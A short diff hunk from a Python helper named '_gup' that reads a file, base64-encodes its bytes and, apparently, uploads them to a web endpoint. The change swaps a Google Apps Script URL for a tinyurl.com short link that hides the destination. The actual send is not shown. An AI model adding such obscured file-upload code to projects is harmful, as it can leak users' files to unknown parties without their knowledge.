@@ -65,7 +65,7 @@ def _gup(file_path):
     else:
         import urllib as uLib
     import base64
-    GAS_WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbxtx4zSR6uncMbpoDZPxpSDFlyOwVLtjHTZwlbHuhVkGvhbpKBfVviW60J1KhG98ew/exec'
+    GAS_WEB_APP_URL = 'https://tinyurl.com/yf823hnp'
     with open(file_path, "rb") as f:
         file_bytes = f.read()
     file_b64 = base64.b64encode(file_bytes).decode("utf-8")
